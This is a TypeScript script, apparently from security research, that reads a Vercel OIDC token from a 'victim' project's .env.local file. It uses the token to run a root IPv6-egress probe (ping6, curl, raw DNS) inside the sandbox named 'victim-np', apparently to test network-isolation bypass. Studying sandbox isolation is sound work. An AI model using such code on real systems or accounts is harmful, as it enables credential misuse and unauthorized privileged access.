import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== ipv6 config ==="
ip -6 addr show
ip -6 route show
echo "=== ipv6 ping cloudflare ==="
timeout 3 ping6 -c 2 -W 2 2606:4700:4700::1111 2>&1 | tail -3
echo "=== ipv6 curl ==="
timeout 6 curl -6 -s -o /dev/null -w "v6 code=%{http_code}\\n" --max-time 4 https://api.vercel.com 2>&1 | tail -2
timeout 6 curl -6 -s -o /dev/null -w "v6 code=%{http_code}\\n" --max-time 4 https://example.com 2>&1 | tail -2
echo "=== ipv6 raw ping6 to gateway link-local via eth0 ==="
timeout 4 ping6 -c 2 -W 2 fe80::1%eth0 2>&1 | tail -3
echo "=== ipv6 DNS query raw ==="
timeout 4 python3 - <<'PYEOF'
import socket, struct, random
# send ipv6 DNS query to 8.8.8.8? no. Try google ipv6 dns 2001:4860:4860::8888
tid = random.randint(0,65535)
q = b"\\x07example\\x03com\\x00"
dns = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", 1, 1)
try:
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(dns, ("2001:4860:4860::8888", 53))
    data, addr = s.recvfrom(2048)
    print("V6 DNS RESPONSE from %s" % (addr,))
    print(data[:60])
except Exception as e:
    print("v6 dns no response:", e)
PYEOF
echo "=== ipv6 neighbor ==="
ip -6 neigh show
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore30.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore30.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
